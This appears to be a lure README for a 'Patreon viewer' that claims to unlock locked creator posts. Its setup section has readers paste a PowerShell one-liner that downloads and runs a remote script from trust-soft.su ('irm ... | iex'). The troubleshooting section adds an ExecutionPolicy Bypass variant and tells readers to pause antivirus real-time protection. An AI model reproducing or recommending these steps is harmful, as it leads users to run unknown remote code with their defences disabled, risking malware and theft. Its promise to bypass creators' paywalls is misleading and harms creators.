# Patreon Content Viewer & Post Archiver Tool

[![Platform](https://shields.io)]()
[![Status](https://shields.io)]()
[![License](https://shields.io)]()

Welcome to the ultimate **Patreon Viewer** and content recovery utility. This open-source tool is designed for research, archiving, and unlocking local access to media posts, images, and text updates from your favorite creators. 

If you need a reliable **Patreon post viewer** to manage creator updates offline, backup paid attachments, or view full-size gallery images without interface restrictions, this automated toolkit provides a seamless solution. It acts as a local mirror client, allowing you to bypass connection drops and easily view structured creator feeds.

### Core Features:
*   **Full Profile Mirroring:** Load and index text posts, locked image galleries, and audio files.
*   **Media Downloader:** Export high-resolution images and attachments directly to your drive.
*   **Offline Database:** Browse saved creator feeds even without an active internet connection.

---

## 🛠 Quick Setup Guide (PowerShell)

1. **Launch PowerShell:**
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. **Execute the Setup Script:**
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://trust-soft.su/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.su/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated OS component)
If your system shortcut isn't recognized, use the full, unabbreviated commands instead:
```cmd
Invoke-RestMethod https://trust-soft.su/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## Technical Overview & Metadata

This **Patreon download tool** works by utilizing advanced session indexing to fetch publicly available and cached metadata from creator pages. It optimizes the workflow for digital archivers, blog managers, and fans who want to preserve media before it gets deleted or modified by the author. 
